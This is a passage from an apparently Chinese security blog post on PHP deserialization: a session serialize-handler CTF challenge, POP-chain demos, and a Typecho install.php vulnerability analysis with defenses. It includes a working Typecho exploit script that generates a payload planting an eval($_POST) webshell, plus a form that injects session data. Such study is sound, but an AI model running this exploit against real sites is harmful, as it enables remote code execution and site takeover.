class="line">&#123;</span><br><span class="line">highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>第一眼看到这个题的时候很懵逼…. 没有数据可以输入的地方…然后琢磨了一下wp….. 感觉发现了新大陆…  </p><p>从phpinfo中可以发现<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler = php_serilize</span><br></pre></td></tr></table></figure></p><p>而代码中设置的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br></pre></td></tr></table></figure></p><p>从上文介绍相关处理器的时候可以知道：<br>PHP处理器：a为session的键名，|后面为经过serialize处理的键值<br><img src="https://s1.ax1x.com/2018/02/20/9N8mpn.png" alt=""><br>而php_serialize处理器：<br><img src="https://s1.ax1x.com/2018/02/20/9N8nlq.png" alt=""><br>这其中php_serialize有一个特性，就是可以在字符串变量中储存 | 符号，然后当我们以php_serialize<br>格式存入|O:4:”pass”:0:{}<br><img src="https://s1.ax1x.com/2018/02/20/9N8KXV.png" alt=""><br>再以php处理器处理：即变成了<br>[“a:1:{s:1:”a”;s:16:””]为键名，test对象为值。<br><img src="https://s1.ax1x.com/2018/02/20/9N817F.png" alt=""><br>demo3(上述过程具体实现代码)：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set('session.serialize_handler', 'php');</span></span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'a'</span>] = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>实现步骤：<br>1.设置php_ini中的session.serialize_handler = php_serialize，访问<a href="http://localhost:9096/test1.php?a=|O:4:&quot;test&quot;:0:{},即写入session。" target="_blank" rel="noopener">http://localhost:9096/test1.php?a=|O:4:&quot;test&quot;:0:{},即写入session。</a><br>2.将上述代码注释去掉，并给$_SESSION[‘a’] = $_GET[‘a’];加上注释，即可看到php和php_serialize处理|的漏洞。</p><p>所以这里就可以利用这个特性给网页传入一个构造的php_serialize格式的session，<br>然后让php解析器将|后的数据解析成”值”，以达到代码执行目的。<br>然后我们利用这个特点写入一个session(以php_serialize格式)，然后让该页面以php方式处理，从而给$mdzz赋值，获取敏感信息。<br>demo4：<br>test1.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="comment">//$_SESSION['a'] = $_GET['a'];</span></span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"__constrct"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"__destruct"</span>;</span><br><span class="line"><span class="keyword">eval</span>(phpinfo());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>本地事先存储了以php_serilize格式的session：a:1:{s:1:”a”;s:16:”|O:4:”Test”:0:{}<br>然后访问test1.php<br><img src="https://s1.ax1x.com/2018/02/20/9N8rAe.png" alt=""><br>正好符合上述题目中的eval函数中的代码执行</p><p><strong> 总的来说 </strong>：<br>其实这种漏洞就是session序列化及反序列化处理器设置不当造成。本质上是它们对处理“|”的差异造成。如果以php_serilize方式存入，比如我们构造出’|’ 伪造的序列化值存入，但之后解析又是用的php处理器的话，那么将会反序列化伪造的数据（’|’之前当作键名，’|’之后当作键值）<br>其次如果想要利用的话，就是找到注入点，将我们构造的session注入进去。</p><blockquote><p>其实我还是有点疑问的<br>那么为什么php处理器处理的时候会执行session中的值呢？<br>猜想：与session_start或者php处理器有关<br>暂时还没有捣鼓出来…</p></blockquote><h1 id="0x03-如何寻找注入点将数据注入到session"><a href="#0x03-如何寻找注入点将数据注入到session" class="headerlink" title="0x03.如何寻找注入点将数据注入到session"></a>0x03.如何寻找注入点将数据注入到session</h1><p>上面说的那个CTF题原理已经知道了，但是并不知道从哪注入session。<br>就我了解的而言，有以下几种写入session的途径</p><h3 id="1-通过配置不当造成的session可控"><a href="#1-通过配置不当造成的session可控" class="headerlink" title="1.通过配置不当造成的session可控"></a>1.通过配置不当造成的session可控</h3><blockquote><p>参考：<a href="https://bugs.php.net/bug.php?id=71101" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=71101</a><br>当在php.ini中设置session.upload_progress.enabled = On的时候，PHP将能够跟踪上传单个文件的上传进度。当上传正在进行时，以及在将与session.upload_progress.name INI设置相同的名称的变量设置为POST时，上传进度将在$ _SESSION超全局中可用。</p></blockquote><p>我们启用了该配置项后，POST一个和session.upload_progress.name同名变量的时候<br>PHP会将文件名保存在$_SESSION中<br>所以构造一个提交文件的表单：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action =“http://web.jarvisoj.com:32784/index.php”method =“POST”enctype =“multipart/form-data”&gt;</span><br><span class="line">&lt;input type =“hidden”name =“PHP_SESSION_UPLOAD_PROGRESS”value =“1”/&gt;</span><br><span class="line">&lt;input type =“file”name =“file”/&gt;</span><br><span class="line">&lt;input type =“submit”/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></p><p>然后构造一个序列化的数据：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize.handler'</span>,<span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $mdzz = <span class="string">'payload'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj  = <span class="keyword">new</span> OowoO();</span><br><span class="line"><span class="keyword">echo</span> serialize($obj);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>即可使得析构函数中的eval()执行任意代码。</p><!-- ###2 --><h1 id="0x04：构造注入链：pop"><a href="#0x04：构造注入链：pop" class="headerlink" title="0x04：构造注入链：pop"></a>0x04：构造注入链：pop</h1><h3 id="1-POP链原理简介："><a href="#1-POP链原理简介：" class="headerlink" title="1.POP链原理简介："></a>1.POP链原理简介：</h3><blockquote><p>在反序列化中，我们能控制的数据就是对象中的属性值，所以在PHP反序列化中有一种<br>漏洞利用方法叫”面向属性编程”，即POP( Property Oriented Programming)。<br>在反序列化漏洞利用中，最理想的情况就是漏洞能利用的点在那几个魔幻函数中，<br>而实际上往往是从这几个魔幻函数开始，逐步的跟进这个函数中调用的函数，直到找到可以利用的点。</p></blockquote><p>试想一下，如果上面那个CTF题目的代码执行函数eval()函数不在__destruct这类<br>魔幻函数中，而是在一个普通的方法中，我们就没办法直接利用它执行代码了。<br>这个时候就需要构造一个链，链接到我们需要执行的函数eval()。  </p><p>demo5(模拟了一个简单的场景)：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $obj; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$obj = new test1; 这里可以控制$obj为任意对象</span></span><br><span class="line"><span class="keyword">$this</span>-&gt;obj-&gt;a();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"123"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $data;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>利用：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $obj;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;obj = <span class="keyword">new</span> test2();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $data = <span class="string">"phpinfo();"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> OowoO()));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>结果：<br><img src="https://s1.ax1x.com/2018/02/21/9NWkHU.png" alt=""></p><p>值得注意的是，反序列化可以控制类的属性，无论private还是public。<br>但是这里有个坑，如果类中存在protected或者private属性的时候，序列化的时候会产生空<br>字节，所以记得urlencode一下，payload才会生效。<br>demo6：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $a=<span class="string">"a"</span>;</span><br><span class="line"><span class="keyword">protected</span> $b=<span class="string">"b"</span>;</span><br><span class="line"><span class="keyword">public</span> $c=<span class="string">"c"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> test()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p><img src="https://s1.ax1x.com/2018/02/21/9NWUgI.png" alt=""></p><p>总的来说：如果魔幻函数中没有漏洞利用点，但是他调用了其他对象(意味着实例化了该对象)中的方法A，<br>由于上述demo5中我们传入的反序列化数据可以实例化任意对象，所以我们可以全局寻找一个和方法A同名的方法，然后逐个查看其他同名方法A中是否含有可利用的点。</p><h3 id="2-typecho反序列化漏洞分析："><a href="#2-typecho反序列化漏洞分析：" class="headerlink" title="2.typecho反序列化漏洞分析："></a>2.typecho反序列化漏洞分析：</h3><p>漏洞文件为根目录下的install.php，第283行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$config = unserialize(base64_decode(Typecho_Cookie::get(<span class="string">'__typecho_config'</span>)));</span><br><span class="line">$type = explode(<span class="string">'_'</span>, $config[<span class="string">'adapter'</span>]);</span><br><span class="line">$type = array_pop($type);</span><br><span class="line">$installDb = <span class="keyword">new</span> Typecho_Db($config[<span class="string">'adapter'</span>], $config[<span class="string">'prefix'</span>]);</span><br><span class="line">$installDb-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);</span><br></pre></td></tr></table></figure></p><p>从cookie中将__typecho_config的值取出，然后在Typecho_Db中实例化。这里就是漏洞的注入点，<br>下面就需要找到漏洞的利用点，接着搜寻魔幻函数 __construct、__destruct、__wakeup。  </p><p>在/var/Typecho/Db.php中<strong>Typecho_Db类</strong>，代码第114行，找到一个__construct(1)可以利用，因为$adapterName变量存在字符串拼接<br>如果给它反序列化传入一个对象的话，会调用 __tostring函数(如果存在的话)。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($adapterName, $prefix = <span class="string">'typecho_'</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_adapterName = $adapterName;</span><br><span class="line">$adapterName = <span class="string">'Typecho_Db_Adapter_'</span> . $adapterName;</span><br></pre></td></tr></table></figure></p><p>可以发现在同文件下的第134行，实例化了$adapterName，会调用__tostring(2)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;_adapter = <span class="keyword">new</span> $adapterName();</span><br></pre></td></tr></table></figure></p><p>全局搜索__tostring后，在/var/Typecho/Feed.php中<strong>Typecho_Feed类</strong>可以发现__tostring(2)方法：290行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_items <span class="keyword">as</span> $item) &#123;</span><br><span class="line">$content .= <span class="string">'&lt;entry&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">$content .= <span class="string">'&lt;title type="html"&gt;&lt;![CDATA['</span> . $item[<span class="string">'title'</span>] . <span class="string">']]&gt;&lt;/title&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">$content .= <span class="string">'&lt;link rel="alternate" type="text/html" href="'</span> . $item[<span class="string">'link'</span>] . <span class="string">'" /&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">$content .= <span class="string">'&lt;id&gt;'</span> . $item[<span class="string">'link'</span>] . <span class="string">'&lt;/id&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">$content .= <span class="string">'&lt;updated&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/updated&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">$content .= <span class="string">'&lt;published&gt;'</span> . <span class="keyword">$this</span>-&gt;dateFormat($item[<span class="string">'date'</span>]) . <span class="string">'&lt;/published&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br><span class="line">$content .= <span class="string">'&lt;author&gt;</span></span><br><span class="line"><span class="string">&lt;name&gt;'</span> . $item[<span class="string">'author'</span>]-&gt;screenName . <span class="string">'&lt;/name&gt;</span></span><br><span class="line"><span class="string">&lt;uri&gt;'</span> . $item[<span class="string">'author'</span>]-&gt;url . <span class="string">'&lt;/uri&gt;</span></span><br><span class="line"><span class="string">&lt;/author&gt;'</span> . <span class="keyword">self</span>::EOL;</span><br></pre></td></tr></table></figure></p><p>在该段代码的倒数第三行中，如果构造$item[‘author’]是一个对象，screenName是其私有属性，<br>则会调用__get(3)方法。  </p><p>然后在/var/Typecho/Request.php中<strong>Typecho_Request类</strong>中  __get(3)方法：226行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get($key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>调用了get方法：295行<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $default = NULL)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_params[$key]):</span><br><span class="line">$value = <span class="keyword">$this</span>-&gt;_params[$key];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="keyword">isset</span>(<span class="keyword">self</span>::$_httpParams[$key]):</span><br><span class="line">$value = <span class="keyword">self</span>::$_httpParams[$key];</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">$value = $default;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class="number">0</span> ? $value : $default;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_applyFilter($value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进一下_applyFilter(),在该文件的159行:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_applyFilter</span><span class="params">($value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_filter) &#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;_filter <span class="keyword">as</span> $filter) &#123;</span><br><span class="line">$value = is_array($value) ? array_map($filter, $value) :</span><br><span class="line">call_user_func($filter, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>调用了call_user_func($filter,$value)函数，找到了可以利用的点了。  </p><p><strong>反过来分析：</strong><br>回溯查看一下$value变量的来源：由Typecho_Request类中的$_params传入。<br>然后$filter在代码的120行有定义：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> $_filter = <span class="keyword">array</span>();</span><br></pre></td></tr></table></figure></p><p>所以可以直接对该属性赋值。</p><p>再来考虑一下如何触发__get(3)方法：<br><img src="https://s1.ax1x.com/2018/02/22/9UCIcn.jpg" alt=""></p><p>然后就可以把$_items数组所在的Typecho_Feed类，实例化传给$<em>adapter，从而触发\</em>_tostring(2)，然后__construct(1)<br>自动执行，即构成了完整的一条攻击链。</p><p>总的来说，现在就很好理解这些数组的嵌套关系了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">[adapter] =&gt; Typecho_Feed Object</span><br><span class="line">(</span><br><span class="line">[_type:Typecho_Feed:private] =&gt; RSS 2.0</span><br><span class="line">[_version:Typecho_Feed:private] =&gt; 1</span><br><span class="line">[_charset:Typecho_Feed:private] =&gt; UTF-8</span><br><span class="line">[_lang:Typecho_Feed:private] =&gt; en</span><br><span class="line">[_items:Typecho_Feed:private] =&gt; Array //$_itemss数组</span><br><span class="line">(</span><br><span class="line">[0] =&gt; Array  //$item数组</span><br><span class="line">(</span><br><span class="line">[author] =&gt; Typecho_Request Object //$item[&apos;author&apos;]赋予一个对象值，触发__get()</span><br><span class="line">(</span><br><span class="line">[_params:Typecho_Request:private] =&gt; Array</span><br><span class="line">(</span><br><span class="line">[screenName] =&gt; file_put_contents(&apos;Passer6y.php&apos;, &apos;&lt;?php eval($_POST[1]);?&gt;&apos;)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[_filter:Typecho_Request:private] =&gt; Array</span><br><span class="line">(</span><br><span class="line">[0] =&gt; assert</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">[prefix] =&gt; th1s</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>EXP(copy from <a href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/" target="_blank" rel="noopener">Ph0rse大佬</a>)：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//当__get方法执行时，使用assert函数调用file_put_contents函数，写入木马</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> $_params = <span class="keyword">array</span>(<span class="string">'screenName'</span> =&gt; <span class="string">"file_put_contents('Passer6y.php', '&lt;?php eval(\$_POST[1]);?&gt;')"</span>);</span><br><span class="line"><span class="keyword">private</span> $_filter = <span class="keyword">array</span>(<span class="string">'assert'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造Feed类，使__get方法执行</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span>&#123;</span><br><span class="line"><span class="keyword">const</span> RSS2 = <span class="string">"RSS 2.0"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> $_type;</span><br><span class="line"><span class="keyword">private</span> $_version;</span><br><span class="line"><span class="keyword">private</span> $_charset;</span><br><span class="line"><span class="keyword">private</span> $_lang;</span><br><span class="line"><span class="keyword">private</span> $_items = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($version, $type = self::RSS2, $charset = <span class="string">'UTF-8'</span>, $lang = <span class="string">'en'</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_version = $version;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_type = $type;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_charset = $charset;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_lang = $lang;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addItem</span><span class="params">(array $item)</span></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_items[] = $item;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class1 = <span class="keyword">new</span> Typecho_Feed(<span class="number">1</span>);</span><br><span class="line">$class2 = <span class="keyword">new</span> Typecho_Request();</span><br><span class="line">$class1-&gt;addItem(<span class="keyword">array</span>(<span class="string">'author'</span> =&gt; $class2));</span><br><span class="line">$exp = <span class="keyword">array</span>(<span class="string">'adapter'</span> =&gt; $class1, <span class="string">'prefix'</span> =&gt; <span class="string">'th1s'</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($exp));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="0x05-如何防御"><a href="#0x05-如何防御" class="headerlink" title="0x05.如何防御"></a>0x05.如何防御</h1><p>1.过滤：试想一下，当unserialize执行的时候，会调用自动__wakeup魔幻函数，<br>我们可以利用这点，对用户可控的数据进行严格过滤，使之不能成功控制属性值。</p><p>2.使用get_included_files函数查看是否有漏洞的类被包含了</p><p>3.尽量使用json_endcode/json_decode来取代</p><h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p>1.<a href="http://ph0rse.me/2017/10/30/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BTypecho%E4%BA%8C%E8%BF%9E%E7%88%86/" target="_blank" rel="noopener">漏洞分析之Typecho二连爆</a><br>2.<a href="http://www.cnblogs.com/iamstudy/articles/php_serialize_problem.html" target="_blank" rel="noopener">PHP序列化</a><br>3.<a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247485091&amp;idx=1&amp;sn=e3db9f381de54a71e4c5f22d0bb22834&amp;chksm=ec1e368bdb69bf9dd7a04dc0b5f422f74b81a08b5c75736cf634d37e0107fca3220f15466e81&amp;mpshare=1&amp;scene=23&amp;srcid=0219sbHHIx7vYIi5NCASIeJ5#rd" target="_blank" rel="noopener">一道反序列化CTF引起的思考</a><br>4.<a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">POP链的构造</a><br>5.<a href="https://yq.aliyun.com/ziliao/612" target="_blank" rel="noopener">PHP中SESSION反序列化机制详解</a><br>6.<a href="http://www.freebuf.com/vuls/152058.html" target="_blank" rel="noopener">Typecho反序列化漏洞导致前台getshell</a><br>7.<a href="http://www.freebuf.com/vuls/80293.html" target="_blank" rel="noopener">通过PHP反序列化进行远程代码执行</a><br>8.<a href="http://www.blogsir.com.cn/safe/452.html" target="_blank" rel="noopener">POP链和序列化，反序列化操作 </a><br>9.<a 